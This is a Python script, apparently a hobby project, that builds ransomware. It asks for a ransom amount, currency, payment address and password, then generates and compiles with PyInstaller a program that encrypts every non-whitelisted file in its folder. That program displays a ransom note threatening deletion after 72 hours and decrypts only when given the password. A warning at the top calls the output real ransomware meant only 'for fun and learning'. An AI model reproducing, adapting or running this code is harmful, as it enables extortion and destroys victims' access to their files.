import os
import sys
from subprocess import run
from distutils.core import setup
import PyInstaller

print("WARNING THIS PROGRAM WILL MAKE REAL RANSOMWARE!!!\n Using the product of this program on other people's computers without their knowlege and premission is ILLEGAL.\n Only use the product for fun and learning.\n\n")

understand = str.lower(input("Do you understand? y/n\n"))

if understand == "y":
    print("Welcome to this ransommaker!")

    fileName = str(input("Please enter your desired file name\n"))

    password = input('Please enter the password to the decryption program\n')

    currency = input('Please specify your desired currency\n')

    ransom = input('Please specify how much of your desired currency you want in USD\n')

    address = input('Atlast, enter the address you wish to use\n')

    ransomware = ('import time\nimport os.path\n\n#Specify your details\nransom = "',ransom,'"\ncurrency = "',currency,'"\naddress = "',address,'"\n\nwhitelist = ["',fileName,'.exe","Maker2.exe","Maker2.py","Maker2Output.py","thekey.key"]\n\n#Code to find and encrypt in the local folder\ndef encrypt():\n\t#! /usr/bin/env python3\n\timport os\n\tfrom cryptography.fernet import Fernet\n\t#file finder\n\tfiles = []\n\tfor file in os.listdir():\n\t\tif file in whitelist:\n\t\t\tcontinue\n\t\tif os.path.isfile(file):\n\t\t\tfiles.append(file)\n\n\tkey = Fernet.generate_key()\n\n\twith open("thekey.key", "wb") as thekey:\n\t\tthekey.write(key)\n\n\tfor file in files:\n\t\twith open(file, "rb") as thefile:\n\t\t\tcontents = thefile.read()\n\t\tcontents_encrypted = Fernet(key).encrypt(contents)\n\t\twith open(file, "wb") as thefile:\n\t\t\tthefile.write(contents_encrypted)\n\n\tprint("__   __                  __ _ _             _                       _                                                        _           _ ")\n\tprint("\ \ / /                 / _(_) |           | |                     | |                                                      | |         | |")\n\tprint(" \ V /___  _   _ _ __  | |_ _| | ___  ___  | |__   __ ___   _____  | |__   ___  ___ _ __     ___ _ __   ___ _ __ _   _ _ __ | |_ ___  __| |")\n\tprint("  \ // _ \| | | | ""_| |  _| | |/ _ \/ __| | "" \ / _` \ \ / / _ \ | "" \ / _ \/ _ \ "" \   / _ \ "" \ / __| ""_| | | | "" \| __/ _ \/ _` |")\n\tprint("  | | (_) | |_| | |    | | | | |  __/\__ \ | | | | (_| |\ V /  __/ | |_) |  __/  __/ | | | |  __/ | | | (__| |  | |_| | |_) | ||  __/ (_| |")\n\tprint("  \_/\___/ \__,_|_|    |_| |_|_|\___||___/ |_| |_|\__,_| \_/ \___| |_.__/ \___|\___|_| |_|  \___|_| |_|\___|_|   \__, | .__/ \__\___|\__,_|")\n\tprint("                                                                                                                  __/ | |                  ")\n\tprint("                                                                                                                 |___/|_|                  ")\n\tprint("To recover your files send ",ransom,"$ worth of",currency," to the address provided during the payment procedure. If this is not done within 72 hours all your files will be DELETED.")\n\n#Deals with payment(not really) and decryption\ndef pay():\n\tprint("Thanks for cooperating. Loading payment details...")\n\ttime.sleep(1)\n\tprint("(          ) 0%")\n\ttime.sleep(0.5)\n\tprint("(=         ) 10%")\n\ttime.sleep(0.5)\n\tprint("(==        ) 20%")\n\ttime.sleep(0.5)\n\tprint("(===       ) 30%")\n\ttime.sleep(0.5)\n\tprint("(====      ) 40%")\n\ttime.sleep(0.5)\n\tprint("(=====     ) 50%")\n\ttime.sleep(0.5)\n\tprint("(======    ) 60%")\n\ttime.sleep(0.5)\n\tprint("(=======   ) 70%")\n\ttime.sleep(0.5)\n\tprint("(========  ) 80%")\n\ttime.sleep(0.5)\n\tprint("(========= ) 90%")\n\ttime.sleep(0.5)\n\tprint("(==========) 99%")\n\ttime.sleep(2)\n\tprint("(==========) 100%")\n\ttime.sleep(0.5)\n\tprint("Payment details loaded")\n\tprint("Please send ",ransom,"$ worth of ",currency," to this address: ",address)\n\tprint("Once payment has been confirmed you will recive your decryption key.")\n\tdecrypt()\n\n\t#decryption\ndef decrypt():\n\t#! /usr/bin/env python3\n\timport os\n\tfrom cryptography.fernet import Fernet\n\t#file finder\n\tfiles = []\n\tfor file in os.listdir():\n\t\tif file in whitelist:\n\t\t\tcontinue\n\t\tif os.path.isfile(file):\n\t\t\tfiles.append(file)\n\t#saves key as secretkey\n\twith open("thekey.key", "rb") as key:\n\t\tsecretkey = key.read()\n\t#password needed to unlock\n\tpassword = "',password,'"\n\tprint("Input your decryption key ( Case sensitive )")\n\tuser_phrase = input()\n\tif user_phrase == password:\n\t\t#decrypts files with secretkey\n\t\tfor file in files:\n\t\t\twith open(file, "rb") as thefile:\n\t\t\t\tcontents = thefile.read()\n\t\t\tcontents_decrypted = Fernet(secretkey).decrypt(contents)\n\t\t\twith open(file, "wb") as thefile:\n\t\t\t\tthefile.write(contents_decrypted)\n\t\tprint("Congratulations! Your files have been decrypted")\n\t\tos.remove("thekey.key")\n\telse:\n\t\tprint("Wrong password")\n\n#doesnt work right now\ndef npay():\n\tprint("Your lack of cooperation is not appreciated. The ransome has increased by 100$")\n\ndef payment():\n\t#checks if files are already encrypted\n\tif os.path.exists("thekey.key") == False:\n\t\tencrypt()\n\t#asks whether the victim wants to pay yet\n\t#if the answer is not yes or y it will repeat and increase the ransom\n\tanswer = ["yes","y"]\n\trun = 1\n\twhile run == 1:\n\t\tprint("Do you wish to pay now? Yes/No")\n\t\tuserInput = str.lower(input())\n\t\tif userInput in answer and userInput == "yes" or userInput == "y":\n\t\t\trun = 0\n\t\t\tpay()\n\t\telse:\n\t\t\trun = 1\n\t\tnpay()\n\t\ttime.sleep(3)\n\npayment()')

    with open("Maker2Output.py", "w") as thefile:
        contents = tuple(map(str, ransomware))
        thefile.write(''.join(contents))

    print("python file generated...")

    os.system("PyInstaller -F Maker2Output.py")

    print("file converted to executable...")

    os.chdir("dist")

    os.rename('Maker2Output.exe', fileName+'.exe')

    print("Your file is done and located in \dist")


